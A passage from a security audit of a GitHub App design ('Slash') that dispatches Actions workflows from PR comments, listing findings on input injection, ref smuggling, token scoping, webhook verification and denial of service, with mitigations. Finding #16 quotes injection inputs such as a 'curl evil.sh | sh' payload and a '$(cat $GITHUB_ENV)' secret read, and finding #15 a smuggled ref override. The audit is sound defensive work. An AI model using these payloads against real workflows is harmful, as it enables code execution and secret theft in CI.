**Recommendation**: Treat correlation as authentication, not string matching. (1) Never correlate on a substring of attacker-influenceable text; require an exact, anchored match of a dedicated marker and require ALL of: `event == "workflow_dispatch"`, `workflow_id` equals the invocation's workflow, `head_branch` equals the invocation's branch, `head_sha` equals the invocation's captured SHA, `run.created_at >= dispatched_at - skew`, and `actor`/`triggering_actor` is the Slash App's bot login (this single check eliminates every human- and fork-PR-originated run). (2) Re-fetch `GET /repos/{o}/{r}/actions/runs/{id}` and make the decision from the API response, never from the webhook body. (3) Stop using the invocation UUID as the correlation secret and stop exposing it as `external_id`: derive a separate high-entropy `slash_nonce`, and if it must appear in `run-name` treat it as public and rely on the actor/workflow/sha predicate for authenticity instead. (4) Enforce one-to-one claiming with a DB unique constraint on `(installation_id, owner, repo, workflow_run_id)` inside the claim transaction, and refuse to re-complete an invocation already in a terminal state. (5) Add regression tests: fork PR titled with a victim marker must not correlate; a human-dispatched run of the same workflow on the same branch must not be claimed.

#### 15. [HIGH] Reserved workflow inputs are user-overridable — `--slash_head_sha=refs/pull/N/head` executes fork code with repo secrets

**Problem**: Nothing in §3, §4.1 or §4.2 forbids the reserved names as user-supplied `--key`s or as `args[].name` entries, and §5's dispatch step specifies the merge order as `inputs = reserved + args`, i.e. user args are applied last and win. Two exploits follow. (a) **Ref smuggling → fork-code execution.** §4.2 makes `slash_head_sha` the sanctioned way for a workflow to know what to check out, so the documented tenant pattern is `actions/checkout` with `ref: ${{ inputs.slash_head_sha }}`. `refs/pull/N/head` exists in the base repo for every PR *including forks*, so `/deploy staging --slash_head_sha=<fork PR head sha>` runs an unreviewed outsider's code inside a same-repo, full-secret, full-GITHUB_TOKEN run. Combined with finding #2 (read-only collaborator passes the write gate) or a `permission: read` command (finding #1), this is a complete pwn-request by a user with no write access. (b) **Correlation hijack.** `--slash_run_id=<victim uuid>` makes the attacker's own benign run carry the victim's marker, forging the victim's check-run conclusion (finding #3) without needing a fork PR at all. (c) A tenant may also *innocently* declare `args: [- name: slash_head_sha]`, silently converting a reserved input into a user-controlled one.

**Evidence**: Spec §5, dispatch step: "POST workflow_dispatch (ref = PR head branch, inputs = reserved + args)" — reserved first, args second. Spec §4.1's complete validation rule list is only: "Unknown top-level or arg-level keys → configuration error", "`required: true` entries must precede optional entries", "Total inputs ... must not exceed ... 10" — no reserved-name reservation. Spec §3 grammar accepts any `--key=value` with no name restrictions. Spec §4.2 defines `slash_head_sha` as "PR head SHA at invocation time" and §4.2's example workflow declares it as a required input, establishing the checkout pattern. `refs/pull/N/head` for fork PRs is fetchable in the base repo, so `actions/checkout` resolves an attacker-supplied fork SHA. Spec §8 asserts "use SHA captured at invocation" as the safety property — an overridable input voids that guarantee entirely.

**Recommendation**: (1) Reserve the entire `slash_` prefix: reject any config whose `args[].name` starts with `slash_` (configuration error), and reject any parsed command-line key starting with `slash_` with a usage error — both as hard validation rules in §4.1 and §3, tested. (2) Change the merge order in §5 to `inputs = args + reserved` so reserved values always overwrite, as defense in depth even if validation is bypassed. (3) Build the input map in a type that cannot silently overwrite (e.g. `try_insert` / error on duplicate key) rather than a plain `HashMap::insert`. (4) In user docs, state that `slash_head_sha` is the only ref a workflow may check out and that workflows should additionally assert `github.sha`/`inputs.slash_head_sha` is an ancestor of the PR branch before running privileged steps.

#### 16. [HIGH] Untrusted comment text is piped into `workflow_dispatch` inputs with no value validation — script injection in tenant workflows

**Problem**: Slash's core function is turning free-text PR comments into workflow inputs, but §3 accepts arbitrary quoted strings as values ("All values are strings") and §4.1 offers only an optional `choices` enum. There is no default charset restriction, no length cap, and no guidance that values are untrusted. Any tenant workflow that interpolates `${{ inputs.<arg> }}` inside a `run:` block — the single most common GitHub Actions anti-pattern, and one that §4.2's own example workflow shape invites — is remotely exploitable: `/deploy "staging\"; curl evil.sh | sh #"` or `/deploy '$(cat $GITHUB_ENV)'` executes attacker shell in a full-secret run. Because `${{ }}` interpolation happens before the shell sees the script, no amount of shell quoting in the tenant's workflow fixes it. Slash makes the injectable path a product feature, so the product must carry the mitigation. Ranked high because the gate that stands between an unprivileged attacker and this is the same gate weakened by findings #1 and #2.

**Evidence**: Spec §3: "Quoting: double quotes group tokens containing spaces; `\"` escapes a quote. All values are strings (matching `workflow_dispatch` input semantics)." — no charset or length constraint. Spec §4.1's arg schema has `choices` marked "optional enum", so the safe case is opt-in and the unsafe case is the default. Spec §4.2's example declares free-form `timeout` and `env` inputs with no constraint. GitHub documents that `run-name` and by extension all `${{ inputs.* }}` interpolation is textual expression substitution (https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#run-name), which is why untrusted input must reach `run:` only via `env:`. Prow's analogue is deliberately not free-form: commands are matched against configured trigger regexes (`presubmit.TriggerMatches`, D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/plugins/trigger/generic-comment.go:216-231) and the job spec comes from trusted config, not from comment text.

**Recommendation**: (1) Default-deny value charset: validate every user-supplied value against a conservative pattern (e.g. `^[A-Za-z0-9._@:/+=-]{0,256}$`) unless the arg opts in with `free_text: true`, and cap total input bytes. (2) Encourage `choices` by making it the documented default for anything that reaches a `run:` step. (3) Ship a `docs/user/` security section with the mandatory pattern — pass inputs via `env:` and reference `"$MY_INPUT"`, never `${{ inputs.x }}` inside `run:` — and put it in `examples/.slash/echo.yml`'s companion workflow so the copy-pasted starting point is safe. (4) Optional but high value: when Slash fetches the target workflow file (already needed to validate declared inputs), lint it for `${{ inputs.* }}` or `${{ github.event.* }}` appearing inside `run:`/`script:` and surface a warning in the check-run summary.

#### 17. [HIGH] Installation tokens are minted installation-wide with all App permissions; App private key sits in an env var; no kill switch — server compromise is RCE in every tenant's CI

**Problem**: §7.1 caches installation tokens "until expiry" and §7.4 grants the App `actions: write`, `contents: read`, `checks: write`, `pull_requests: write`. Nothing narrows a token to the repository being served or to the permission actually needed for the call. A single compromise of the Slash process (or of `SLASH_GITHUB_PRIVATE_KEY`, which §7.1 places in an environment variable — readable from `/proc`, container inspection, crash dumps, and any accidental env-dump in tracing) yields, across *every* tenant repository simultaneously: arbitrary `workflow_dispatch` on any branch (⇒ arbitrary code execution with each tenant's production secrets), full source read, deletion of workflow-run logs and artifacts to destroy evidence, and comment/reaction/check-run forgery under the trusted App identity. The App private key cannot be scoped or partially revoked; there is no mention of rotation, of a per-installation kill switch, of egress restriction, of token/secret redaction in logs, or of an audit trail of what Slash dispatched on whose behalf. The spec's own framing — "near-stateless", "single stateless container" — treats this as an ops detail rather than the system's central trust concentration.

**Evidence**: Spec §7.1: "GitHub client: `octocrab` (App auth: JWT → installation tokens, cached until expiry)" and "Config: environment variables (`SLASH_GITHUB_APP_ID`, `SLASH_GITHUB_PRIVATE_KEY`, ...)". Spec §7.4: "Permissions: `checks: write`, `actions: write`, `contents: read`, `pull_requests: write`, `metadata: read`." GitHub supports narrowing at token-mint time — "Create an installation access token for an app" accepts `repositories` / `repository_ids` ("List of repository names that the token should have access to") and `permissions` ("specify granular access levels"), with a 1-hour lifetime (https://docs.github.com/en/rest/apps/apps) — so the spec's installation-wide cached token is a deliberate-by-omission choice, not a platform constraint. Prow, by contrast, does not funnel all tenants through one credential and supports per-org/per-repo webhook secrets with rotation (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/github/hmac.go:89-119).

**Recommendation**: (1) Mint per-repository, least-permission tokens: key the cache on `(installation_id, repo_id, permission_set)` and request only `actions:write` for a dispatch, `checks:write` for a check update, `contents:read` for the config read. This bounds a leaked token to one repo and one verb. (2) Move the private key out of the environment: file-mounted secret with 0400, or a KMS/HSM signing call so the key never enters process memory; zeroize after JWT signing; add an explicit deny-list preventing the config struct from being `Debug`-logged. (3) Add an operational kill switch (per-installation and global disable flag checked before every mutating call) and a structured audit log of every dispatch (installation, repo, PR, actor, command, workflow, ref, resulting run id) written before the API call. (4) Invalidate cached tokens on `installation.suspend`/`deleted` and `installation_repositories.removed`, and drop queued work for those repos. (5) Add key rotation to the deployment notes in M7 and a documented incident procedure (rotate key, revoke tokens via `DELETE /installation/token`).

#### 18. [MEDIUM] Dispatch targets a mutable branch name while the check run asserts a captured SHA; no pre-dispatch tip check, no post-hoc `head_sha` verification, ambiguous ref resolution

**Problem**: §5 captures `head_sha` and creates the check run against it, then dispatches with `ref` = *branch name*. `workflow_dispatch` cannot take a SHA, so the code and workflow YAML that actually run are whatever the branch tip is at dispatch time — which is not what the check run reports on, and not what any reviewer approved. This is a genuine TOCTOU: between the permission check and the dispatch (a window spanning several API round-trips, plus queueing and any retry/backoff from §8), anyone with push access to that branch can force-push. Result: the `slash/<command>` check reports `success` for SHA A while SHA B executed, or vice versa; §8's stated safety property ("use SHA captured at invocation") is not actually enforced anywhere. Secondarily, `ref` is passed as a bare name, and GitHub's API documents only "a branch or tag name" with unspecified precedence — a write-access attacker can create a tag whose name equals the PR head branch and make resolution ambiguous. Third TOCTOU: §5 checks the actor's permission before dispatch with no re-check, and nothing re-validates that the branch still belongs to the PR.

**Evidence**: Spec §5: "POST workflow_dispatch (ref = PR head branch, inputs = reserved + args)"; §5.1: "`ref` = head branch name"; §8: "PR head SHA changes between comment and dispatch → use SHA captured at invocation; late runs still report against the captured SHA (correct: the command was issued against that state)" — the reasoning is inverted, because the *execution* did not happen against that state. GitHub docs: "The git reference for the workflow. The reference can be a branch or tag name." (https://docs.github.com/en/rest/actions/workflows) — no SHA support, no branch/tag precedence rule. Prow avoids this class entirely by pinning: the ProwJob's refs carry explicit `BaseSHA` and `Pulls[].SHA` so the clone is byte-exact (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/pjutil/pjutil.go:138-152, `SHA: pr.Head.SHA`, consumed by `NewPresubmit` at :159-169).

**Recommendation**: (1) Immediately before dispatch, re-read the branch tip (`GET /repos/{o}/{r}/git/ref/heads/{branch}`) and abort with a user-visible "the PR head moved, re-issue the command" comment if it differs from the captured SHA — this shrinks the window to milliseconds. (2) Pass a fully-qualified `ref: refs/heads/<branch>` to remove branch/tag ambiguity, and verify it is accepted in M3 integration tests. (3) After correlation, compare `workflow_run.head_sha` with the invocation's captured SHA and, on mismatch, complete the check run as `neutral`/`failure` with an explicit "executed code did not match the reviewed SHA" summary rather than reporting a misleading success. (4) Document the mandatory workflow-side assertion: fail fast if `github.sha != inputs.slash_head_sha`. (5) Re-check the actor's permission immediately before dispatch, or at minimum record the permission-check timestamp in the invocation row for audit.

#### 19. [MEDIUM] No PR state, draft, or robust fork check: commands accepted on closed/merged PRs and on stale branches

**Problem**: §5's guard list is "is PR? not bot? first line starts with `/`?" then "PR head repo == base repo?". It never checks that the PR is open, or non-draft. An attacker can therefore comment `/deploy production` on a long-closed or already-merged PR whose head branch still exists — the branch is no longer under review, its protection/approval state is irrelevant, and reviewers are no longer watching the thread. On a merged PR the head branch may have been reused or re-pointed, giving a clean ref-confusion primitive that pairs with finding #7. The fork check is also under-specified: `issue_comment` payloads carry no PR head information at all (only `issue.pull_request` URLs), so the PR must be fetched; `head.repo` is `null` when the fork has been deleted, and comparing `full_name` rather than `repo.id` is brittle across renames/transfers. A null-`head.repo` PR that is treated as "not a fork" would be dispatched against a branch name that does not exist in the base repo — or, worse, against a same-named branch that does.

**Evidence**: Spec §5's guard sequence contains no PR-state predicate. Contrast Prow, which gates on state explicitly: "if gc.Action != github.GenericCommentActionCreated || !gc.IsPR || gc.IssueState != \"open\" { return nil }" (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/plugins/trigger/generic-comment.go:46-48), and separately refuses to build drafts (`buildAllButDrafts`, D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/plugins/trigger/pull-request.go:383-390) and unmergeable PRs ("If the PR is not mergeable ... we will not trigger any jobs", D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/plugins/trigger/trigger.go:337-345). Spec §2.4 makes the fork exclusion a security boundary ("Fork PRs ... get a polite explanatory comment and no dispatch"), so its detection must be exact.

**Recommendation**: (1) Add hard guards to §5: dispatch only when the freshly fetched PR has `state == "open"`; make draft handling an explicit decision (recommend refuse, with a comment) rather than an omission. (2) Determine fork status from the fetched PR by comparing `head.repo.id != base.repo.id`, and treat `head.repo == null` as a fork (deny). Never infer head info from the `issue_comment` payload. (3) Verify the head branch still resolves to the PR's head SHA (see finding #7) — this simultaneously closes the stale/reused-branch case. (4) Add these as explicit rejection branches in the M5 exhaustive decision-tree tests.

#### 20. [MEDIUM] Unprivileged comment amplification: error comments precede the trust gate and the 10-minute polling fallback multiplies one comment into ~100 API calls, exhausting the tenant's rate limit

**Problem**: Two amplification primitives, both reachable without write access. (a) **Error-comment spam.** §5's ordering puts config loading, command matching, and their user-visible failure comments *before* the permission check, so any user who can comment (on a public repo: anyone) makes Slash spend API calls and post a PR comment for every `/nonexistent`. There is no rate limit, no per-actor quota, and no comment deduplication or pruning anywhere in the spec, so a script produces unbounded notification spam to every PR subscriber and burns the installation's shared 5,000 req/hr budget — which is per *installation*, so one attacker on one public repo degrades Slash for every repo in that org. GitHub's secondary/content-creation limits will also trip, risking abuse flags against the App itself. (b) **Polling amplification.** §6.3.3 arms a 60-second wait plus up to 10 minutes of polling per invocation that never correlates. An attacker with write access (or via any read-gated command) can guarantee non-correlation by removing `workflow_dispatch` from the workflow on the PR head branch — the dispatch still succeeds against the default-branch-registered trigger but no run is created — turning each comment into hundreds of seconds of polling and ~100 API calls. Roughly 50 comments exhaust the tenant's hourly quota; a few thousand saturate the shared in-process queue described in §7.3, which has no stated bound, no per-tenant fairness, and no backpressure, making this a cross-tenant DoS.

**Evidence**: Spec §5 flow order: config load → match command → *then* "permission check on comment author". Spec §6.4: "😕 reaction + a PR comment: any user-correctable failure (unknown command, bad args ..., permission denied, config error, fork PR)" — every one of these is attacker-triggerable at will. Spec §6.3.3: "if no `workflow_run` webhook correlates within 60s of dispatch, poll the runs API with the same predicate. If nothing is found within 10 minutes, mark the check run `completed/failure`". Spec §7.3: "verify ... enqueue in-process, return 200 fast" — no queue bound or quota. Spec §8 lists rate limits only as a client-side backoff concern, not as a shared exhaustible resource an attacker can drain. Prow's countermeasures: it filters on trust *before* responding (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/plugins/trigger/generic-comment.go:64-95, cheap regex relevance check first, then trust, and it only comments once trust is resolved) and it actively prunes its own stale comments (`cp.PruneComments(...)`, same file lines 198-204; `DeleteStaleComments` in the client interface at D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/plugins/trigger/trigger.go:174).

**Recommendation**: (1) Reorder §5: resolve actor trust immediately after the cheap syntactic guards, and stay *silent* (reaction only, or nothing) for unknown commands and config errors when the actor would fail the repo's minimum command gate. (2) Add a token bucket per (installation, repo, actor) and per (installation) for all mutating GitHub calls, with a hard daily cap; when exhausted, degrade to reaction-only. (3) Deduplicate/prune: never post an error comment identical to one Slash already posted on the same PR for the same head SHA; prune superseded error comments like Prow does. (4) Replace per-invocation in-memory polling with a single DB-driven sweeper that batch-polls (one `GET /actions/runs?event=workflow_dispatch&branch=...` per repo per tick covers all pending invocations for that repo), and bound total pending invocations per installation. (5) Bound the in-process queue explicitly and shed load per-tenant (fair queueing by installation_id) rather than globally, so one tenant cannot starve others; add the redelivery-burst behavior to the DoD's p99 check as an *adversarial* load test, not just a redelivery test.

#### 21. [MEDIUM] Webhook verification gaps and no second factor: one leaked App webhook secret forges dispatches in every tenant repo

**Problem**: §7.3 says only "verify `X-Hub-Signature-256` (constant-time)", which leaves the standard footguns unaddressed: accepting a request when the header is absent, accepting the legacy SHA-1 `X-Hub-Signature`, verifying a re-serialized body instead of the exact received bytes (an axum `Json<T>` extractor makes this mistake structurally easy), no request body size cap (memory DoS), and no behavior specified when the secret is unset (must refuse to boot, never skip verification). Replay is also unhandled in the strong sense: §7.2 permits idempotency keyed on "delivery GUID **or** natural keys", and natural-key idempotency does not stop replay of a captured valid delivery — an attacker who obtains one delivery body+signature (proxy logs, a leaked trace, an SSRF'd log store) can re-dispatch it indefinitely. Most importantly, a GitHub App has exactly *one* webhook secret shared by all tenants, and the spec makes signature validity the sole authorization for acting: a forged `issue_comment` naming a real maintainer passes the §5.2 permission check (the API confirms that real user has write), and a forged `workflow_run` completes check runs directly, because §6.3 consumes the payload's `conclusion` and `display_title` without re-reading anything. Secret compromise therefore equals arbitrary workflow dispatch and arbitrary check-run conclusions across the entire tenant base, with no defense in depth.

**Evidence**: Spec §7.3: "`POST /webhook`: verify `X-Hub-Signature-256` (constant-time), enqueue in-process, return 200 fast". Spec §7.2: "keying on delivery GUID **or** natural keys, upserts over inserts". Prow's implementation enumerates the checks the spec omits: reject non-POST, missing `X-GitHub-Event`, missing `X-GitHub-Delivery`, missing `X-Hub-Signature-256` (403), and wrong content-type, all before reading the body, then HMACs the raw bytes (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/github/webhooks.go:31-72); `ValidatePayload` requires the `sha256=` prefix, hex-decodes, and uses `hmac.Equal` (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/github/hmac.go:41-79). Prow also supports per-org/per-repo secrets with rotation windows, which a GitHub App cannot (`extractHMACs`, same file :89-119) — evidence that a single global secret is a known weakness worth compensating for. Prow's tests include GitHub's official vector (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/github/hmac_test.go:105-108).

**Recommendation**: (1) Specify verification precisely in §7.3: require the `X-Hub-Signature-256` header (403 if absent), require the `sha256=` prefix, hex-decode and compare with a constant-time primitive over the *raw* body bytes (axum `Bytes` extractor, parse JSON only after verification), never honor `X-Hub-Signature`, require `content-type: application/json`, require `X-GitHub-Delivery` and `X-GitHub-Event`, and set an explicit `RequestBodyLimit` (GitHub caps payloads at 25 MB — pick a value and test both sides of it). (2) Refuse to start if `SLASH_WEBHOOK_SECRET` is empty; add a test asserting the server rejects unsigned requests even in dev mode. (3) Make GUID-keyed dedupe mandatory, not an alternative: a `deliveries(guid PRIMARY KEY, received_at)` table with a unique insert as the gate, plus TTL cleanup — drop the "or natural keys" wording. (4) Add the second factor: before any mutating action, re-fetch the referenced object from the API and act on the API's version — `GET /repos/{o}/{r}/issues/comments/{id}` to confirm the body/author/created_at of a comment, `GET /repos/{o}/{r}/actions/runs/{id}` to confirm a run's conclusion, workflow, branch, SHA, and actor. This makes a forged payload a no-op. (5) State HTTPS-only termination and add the App private key / webhook secret to a log-redaction deny-list.

#### 22. [MEDIUM] Markdown/HTML injection and unbounded length in check-run summaries and error comments that echo raw comment text

**Problem**: §7.2 stores `raw_comment_line` and §5/§6.2 echo the "command line" into the check-run summary, while §6.4's error comments quote the offending input back at the user. Check-run summaries and issue comments both render Markdown and a subset of HTML. Because the echoed text is fully attacker-authored, an attacker gets to author content inside a surface that carries the Slash App's trusted identity: phishing links and impersonated instructions ("Slash: your installation token expired, re-authorize at …") in the Checks tab where users do not expect user-generated content, `<details>` blocks that hide payloads from casual review, and embedded images that leak the IP/UA of every reviewer who opens the PR. Length is also unbounded — a comment's first line can be tens of kilobytes; check-run `output.summary` has a hard server-side cap, so an over-long echo turns into a 422 and a check run stuck in `queued`, which is a merge-blocking DoS when `slash/<command>` is a required check (see finding #13). Separately, echoing raw comment text copies any secret a user accidentally pasted into a second retention surface (the check run and the `invocations` table), broadening exposure and complicating deletion.

**Evidence**: Spec §6.2/§6.3: "summary: run link, duration, actor, command line"; §7.2 column list includes `raw_comment_line`; §6.4: "a PR comment: any user-correctable failure (unknown command, bad args **with a usage block** ...)". Spec §9 centralizes user-facing strings but says nothing about escaping. GitHub documents `output.summary` as Markdown-rendering (https://docs.github.com/en/rest/checks/runs). Prow treats echoed user text as hostile-by-default: it wraps quoted bodies in a collapsed `<details>` block and quotes rather than inlines (`FormatResponse`/`FormatResponseRaw`, D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/plugins/respond.go:36-71) and strips code blocks from bodies before matching commands (`markdown.DropCodeBlock`, D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/markdown/code_block.go:25-27, used at generic-comment.go:65).

**Recommendation**: (1) Never emit raw user text: hard-truncate the echoed command line (e.g. 200 chars), strip control characters and newlines, and render it inside a fenced code block using a fence longer than any backtick run in the input (or escape backticks) so it cannot break out. (2) Explicitly document in the §9 message module that all interpolated user values pass through one `escape_user_text()` helper, and property-test that no input produces output containing an active link, image, or HTML tag. (3) Cap total summary/comment length below GitHub's limit and make over-long content a graceful truncation, never a 422 — plus a fallback path that completes the check run with a static message if the API rejects the summary. (4) Store a truncated, sanitized `raw_comment_line` (or a hash plus the parsed args) rather than the full line, and add a retention/purge policy for the `invocations` table. (5) Consider dropping `actor`/`command line` from the summary entirely in favor of a link to the originating comment, which cannot be spoofed.

#### 23. [MEDIUM] Config-parsing hardening: YAML resource exhaustion, unvalidated `workflow` path used as a URL segment, unvalidated `command` name, non-file directory entries

**Problem**: §4 loads `.slash/*.yml` from the default branch on every invocation with no stated limits, and §4.1's validation list covers schema shape only. Four concrete gaps. (a) **YAML bombs**: no cap on file size, alias/anchor expansion, or nesting depth. The contents API will hand back up to ~1 MB of inline YAML, and a libyaml-family parser will happily expand nested aliases into gigabytes; this is a per-comment DoS on a shared multi-tenant process (and note the plan does not name a YAML crate — `serde_yaml`, the obvious `deny_unknown_fields` choice, is archived/unmaintained and will receive no security fixes). (b) **`workflow` as a URL path segment**: `POST /repos/{o}/{r}/actions/workflows/{workflow_id}/dispatches` interpolates the config-supplied `workflow` value; an unvalidated value containing `..%2F`, a query string, or a numeric ID reaches a different endpoint than intended. (c) **`command` name**: §3 constrains `/[a-z][a-z0-9-]*` for the *comment* side, but §4.1 imposes no pattern on the config's `command:` field, so a config can declare a name that is unmatchable, or one containing newlines/slashes that corrupts the `slash/<command>` check-run name. (d) **Directory entries**: the contents listing can contain `symlink` and `submodule` types and up to 1,000 entries; following a symlink's target or fetching every entry unbounded is both a correctness and a resource problem.

**Evidence**: Spec §4: "Location: `.slash/*.yml` (also `.yaml`) at the repository root" with no size or count limit; §4.1's validation rules are only unknown keys, ordering, the ≤10 input cap, and the permission enum. Spec §4.1: "`workflow: deploy.yml` # required; file under `.github/workflows/`" — a comment, not a validation rule. Spec §3 defines the command-name regex only for parsing comments. The plan's M2 exit criteria (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/slash/docs/design/0.0.1-implementation-plan.md:48-56) list serde `deny_unknown_fields` and semantic rules but no resource limits; the DoD does ask for "No panics reachable from untrusted input (webhook bodies, comments, YAML) — fuzz or property tests" (:122-123), which covers panics but not exhaustion. Prow hit the symlink case in practice and documents the restriction: "Symlinks inside the `.prow` directory that point to outside the directory are not supported" (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/site/content/en/docs/inrepoconfig.md:127-131). GitHub's dispatch endpoint takes the workflow as a path parameter (https://docs.github.com/en/rest/actions/workflows).

**Recommendation**: (1) Impose explicit limits in §4 and enforce them in `slash-config`: max total `.slash/` bytes (e.g. 256 KB), max files (e.g. 50), max YAML nesting depth, and either disable anchors/aliases or cap expansion; choose a maintained parser and record the decision (evaluate `serde_norway`/`yaml-rust2`-based options over archived `serde_yaml`). (2) Validate `workflow` against `^[A-Za-z0-9._-]{1,100}\.(yml|yaml)$`, reject any `/`, `\`, `%`, or `..`, and percent-encode it when building the URL. (3) Apply the §3 command regex to the config's `command:` field as a validation rule, with a length cap, and derive the check-run name only from the validated value. (4) Process only entries whose `type == "file"` with a matching extension; explicitly ignore `symlink`, `submodule`, and `dir`, and document it as Prow does. (5) Add the YAML-bomb and oversized-config cases to the M2 fuzz/property suite as *time and memory* assertions, not just no-panic assertions.

#### 24. [MEDIUM] Fail-open/fail-closed is unspecified for the permission check, and there is no durable reconciliation for check runs stuck in `queued`

**Problem**: Two availability-to-integrity failure modes the spec leaves undefined. (a) **Permission-check failure semantics**: §5 describes only the denied branch ("denied → comment + 😕"). What happens when `GET /collaborators/{u}/permission` returns 5xx, 403 (rate-limited), or 404 is unstated. Combined with §8's "honor `Retry-After` ... exponential backoff" and §2.2's "errors reported to the user in the PR, never silently dropped", an implementer optimizing for the stated principle can easily land on "proceed and let the workflow decide" or on treating a 404 as a benign miss. Any non-deny outcome on error is a full authorization bypass, and it is *attacker-inducible*: an attacker who first exhausts the installation's rate limit (finding #9) then issues the real command turns a transient error into an open gate. (b) **Stuck check runs**: §5 creates the check run `queued` *before* dispatch, and §6.3's 60s/10min timers are described as per-invocation waits with no durable backing. A process restart, a deploy, or a queue drop between check-run creation and dispatch (or before the timeout fires) leaves the check permanently `queued`. When `slash/<command>` is a required status check — the spec's headline feature — that is an unbounded merge block with no recovery path, and it also violates §2.2. The mirror-image risk is a malicious collaborator deliberately inducing a config error (e.g. adding a duplicate `command:` file, which §4 makes an error surfaced only at invocation time) so the required check can never be created at all.

**Evidence**: Spec §5: "permission check on comment author (denied → comment + 😕)" — no error branch. Spec §2.2: "errors reported to the user in the PR, never silently dropped." Spec §5/§6.3: check run is created `queued` before dispatch; "if no `workflow_run` webhook correlates within 60s of dispatch, poll ... If nothing is found within 10 minutes, mark the check run `completed/failure`" — timers with no stated persistence, in a service §7.1 describes as "single stateless container" with "Horizontal scale-out safe". Spec §4: "Duplicate command names across files are a configuration error (reported when a command is invoked)." Prow treats exactly this stuck-PR hazard as a first-class problem and prescribes a dedicated guard job: "you need to add a config verification job to make sure people get told about mistakes in their Inrepoconfig rather than the PR being stuck" (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/site/content/en/docs/inrepoconfig.md:55-60). Prow also fails closed on trust-resolution errors, returning the error rather than proceeding (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/plugins/trigger/generic-comment.go:72-75).

**Recommendation**: (1) State explicitly in §5.2 that *any* non-success outcome of the permission resolution — 5xx, 403, 404, timeout, unparseable role — is a **deny**, with a distinct user-facing message ("could not verify your permissions, try again"), and add a test per error class. Never let a rate-limit condition become an allow. (2) Make all timers durable: store `dispatched_at` and a `next_poll_at`/`deadline` on the invocation row and drive correlation and timeout from a DB-backed sweeper that any replica can run (with `SELECT ... FOR UPDATE SKIP LOCKED`), so restarts and scale-out cannot orphan work. (3) Add a startup and periodic reconciliation pass that finds `queued` invocations older than the deadline and completes them as `failure` with an explanatory summary. (4) Consider creating the check run only *after* a successful dispatch (or immediately completing it as `failure` if the dispatch call fails) so a crash cannot leave a permanently pending required check. (5) Ship a `slash validate` / config-verification story for `.slash/` (a linter action tenants can run as a presubmit) so config errors surface on the PR that introduces them rather than blocking later PRs.

#### 25. [MEDIUM] No verifiable human actor is delivered to the workflow; every run is attributed to the Slash bot, destroying attribution and collapsing `github.actor`-based authorization

**Problem**: §4.2's reserved inputs are only `slash_run_id`, `slash_pr_number`, `slash_head_sha`. The invoking human's identity is never passed to the workflow, even though §6.2 puts "actor" in the check-run summary — so Slash knows it and deliberately keeps it out of the execution context. Because the dispatch is performed with the App's installation token, `github.actor` and `github.triggering_actor` inside every Slash-triggered run are the Slash bot. Two consequences. (a) **Non-repudiation loss**: a tenant's Actions history and audit log show `slash[bot]` deployed to production, with the only mapping to a human living inside Slash's private database — an external service the tenant cannot audit. Post-incident, "who deployed this?" is unanswerable from the tenant's own records. (b) **Authorization collapse inside workflows**: guards of the form `if: github.actor == '...'` or `if: contains(fromJSON(vars.RELEASE_APPROVERS), github.actor)` are extremely common, and under Slash every invocation presents the same trusted bot identity regardless of which human typed the command — so a workflow that intends per-user authorization silently authorizes everyone who clears Slash's coarser gate. The naive fix (add a user-supplied `slash_actor` arg) is worse than nothing, since finding #4 shows user args currently override reserved inputs, making the identity spoofable.

**Evidence**: Spec §4.2's reserved-input table has exactly three rows and no actor. Spec §6.2: "summary: run link, duration, actor, command line" — the actor is known and surfaced to humans but not to the workflow. Spec §7.4 grants the App `actions: write`, so the dispatch is App-authenticated by construction. GitHub's own `run-name` example illustrates the assumption Slash breaks: `run-name: Deploy to ${{ inputs.deploy_target }} by @${{ github.actor }}` (https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#run-name) — under Slash that renders the bot, not the requester. Prow preserves the requesting identity end-to-end: the ProwJob records the PR author and the triggering event GUID as first-class fields/labels (`Author: pr.User.Login` at D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/pjutil/pjutil.go:140-150; `labels[github.EventGUID] = eventGUID` at :159-169), which is what makes its job history auditable.

**Recommendation**: (1) Add `slash_actor` (the verified comment author's login) and `slash_actor_id` (the numeric user ID, which is immutable across renames) to the §4.2 reserved-input table, and add `slash_comment_url` for a verifiable back-link. (2) Enforce finding #4's fixes first so these can never be user-supplied: reserve the `slash_` prefix in config and on the command line, and merge reserved inputs last. (3) Document that workflows must use `inputs.slash_actor_id` — not `github.actor` — for any identity-based decision, and that `github.actor` will always be the Slash bot. (4) Persist and expose an audit record per dispatch (actor, actor_id, resolved permission, command, workflow, ref, run id) and give tenants a way to retrieve it, so attribution does not depend solely on Slash's private state.

#### 26. [LOW] Correlation claiming and state are not provably tenant-scoped; unbounded retention of raw comment text

**Problem**: §6.3's heuristic claim predicate is described as "(repo, workflow file, `event=workflow_dispatch`, head branch, `created_at` ≥ dispatch time − skew)" — `installation_id` and `owner` are absent from the stated predicate even though §7.2 stores them as separate tenancy columns. `repo` alone is not unique across owners (thousands of repos are named `api`, `web`, `infra`), so a claim query that omits owner/installation scoping will cross-correlate between tenants: tenant A's workflow run completing can flip tenant B's check run, which is both a cross-tenant integrity break and an information leak (B's check-run summary would carry a `details_url` pointing into A's repository). §7.2 promises "invocation claiming uses DB transactions" but specifies no uniqueness constraint that would make double-claiming impossible. Separately, the `invocations` table stores `raw_comment_line` and `args` indefinitely with no retention policy, concentrating every tenant's PR command text — including values users may have pasted from secret managers — in one shared multi-tenant database.

